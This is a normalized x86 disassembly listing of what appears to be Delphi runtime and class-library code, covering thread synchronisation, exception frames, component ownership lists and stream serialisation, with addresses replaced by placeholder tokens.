mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_4169fc
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418fa8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416e98
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_415928
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_416e98
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418f83
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_418734
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_416e98
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_415928
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_416e98
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_410160
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
lea eax [ ebp - 0x1c ]
call sub_4054e8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40cb48
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418f8a
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
sub_418fec
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4191e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40e6bc
mov eax [ ebp - 0x4 ]
call sub_416e74
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
jmp [ eax * 4 + jump_table_41902e ]
mov eax [ ebp - 0x4 ]
call sub_4188d4
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4179e4
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_40f998
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4179e4
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_40f998
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4179e4
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_40f998
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4177c8
mov eax ebx
call sub_40fa28
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41780c
mov eax ebx
call sub_40fa28
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417850
mov eax ebx
call sub_40fa50
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4178a0
mov eax ebx
call sub_40fa3c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418734
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40fa64
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4187f0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40fa90
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4188d4
cmp al 0x9
sete dl
mov eax ebx
call sub_40fa00
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_418e24
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40e9e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417a50
push edx
push eax
mov eax ebx
call sub_40f9d4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191ed
lea eax [ ebp - 0x1c ]
call sub_40e6d0
lea eax [ ebp - 0xc ]
call sub_40458c
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
mov eax ebx
call sub_410248
jmp r-xdata
sub_4191f4
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_419240
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41926c
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_4193dc
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4191f4
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_4193dc
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4191f4
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_4193dc
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_4191f4
jmp r-xdata
pop edx
pop ebx
retn
sub_4192f0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4042b8
je r-xdata
mov eax esi
call sub_40416c
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_40416c
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_4193dc
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4191f4
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_4191f4
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_4193dc
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4191f4
mov dl 0x6
mov eax ebx
call sub_4193dc
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4191f4
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_4191f4
sub_419388
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4193cd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_40595c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4192f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193d4
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_419488
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
call sub_41943c
mov eax ebx
call sub_419448
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_419616
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4195f7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4195fe
mov eax [ ebp - 0xc ]
call sub_4030f0
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413860
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413750
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4195c1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_419592
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_419628
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_419464
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_419669
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403ea4
mov eax [ ebp - 0x4 ]
call sub_4030f0
sub_41966e
call sub_40279c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_4038e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_419464
test bl bl
je r-xdata
mov eax esi
call sub_403ea4
mov eax [ ebp - 0x4 ]
call sub_4030f0
sub_4196d0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_41977a
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4030c0
call sub_419470
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_419628
xor edx edx
xor eax eax
call sub_403e60
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_4033fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419781
lea eax [ ebp - 0x10 ]
call sub_403eac
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40a9b8
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
sub_4197a0
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
mov eax [ esi + 0x38 ]
call sub_4030f0
call sub_41947c
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_419a60
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
mov eax esi
call sub_419a68
mov eax esi
call sub_419a38
sub_419814
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_419882
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419889
lea eax [ ebp - 0x14 ]
call sub_403eac
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40a9b8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
sub_4198d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4199f2
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4199d4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_413704
call sub_419464
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_4199b5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4199bc
push rw-data
call EnterCriticalSection
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
sub_419a10
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
mov eax [ eax ]
call sub_4198d0
pop ebp
retn 0x8
sub_419a38
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_419890
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_419a68
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_419890
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_419488
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_419890
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_419b0c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_419cc4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_419b58
push ebx
push esi
push ecx
call sub_403464
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_419dac
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_419d54
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_413e30
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_419d1c
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_40344c
lea eax [ ebx + 0x14 ]
call sub_40cb14
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_413860
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_419bdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4138bc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413704
mov edx ebx
mov eax esi
call sub_419bdc
sub_419c70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413704
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x10 ] eax
sub_419c9c
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4139fc
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_4030f0
xor eax eax
mov [ ebx + 0x10 ] eax
sub_419cc4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4032ec
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_419c70
mov dl 0x1
mov eax ebx
call sub_41a1e4
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41a194
sub_419d1c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41a1e4
mov edx ebx
mov eax esi
call sub_419c9c
pop edi
pop esi
pop ebx
retn
sub_419d54
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_413948
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_419d1c
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_419c9c
sub_419dac
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_413860
call sub_419dac
inc edi
dec esi
jne r-xdata
sub_419de8
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4139fc
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_4030f0
xor eax eax
mov [ ebx + 0x14 ] eax
sub_419e0c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419de8
mov edx ebx
mov eax esi
call sub_419de8
pop esi
pop ebx
retn
sub_419e28
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_419e0c
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_413860
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_419e84
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_419c30
push ebx
push sub_419c58
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_419c44
push ebx
push sub_419c64
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_419f7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407ab0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_41a014
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
sub_41a014
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_413860
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407ab0
test al al
jne r-xdata
sub_41a064
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4042b8
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407bcc
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2b8
call sub_403864
xor edx edx
mov eax ebx
call sub_41a1e4
mov edx esi
mov eax ebx
call sub_41a0f0
mov dl 0x1
mov eax ebx
call sub_41a1e4
sub_41a104
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413860
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4137ec
sub_41a140
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_4138bc
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413750
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_4138dc
sub_41a194
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41a130
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41a104
mov cl 0x1
mov edx ebx
call sub_41a194
inc edi
dec ebp
jne r-xdata
sub_41a1e4
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404148
mov edx esp
mov eax esi
call sub_4033ac
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41a22c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41a254
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41a29c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031a4
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a2fc
push ebp
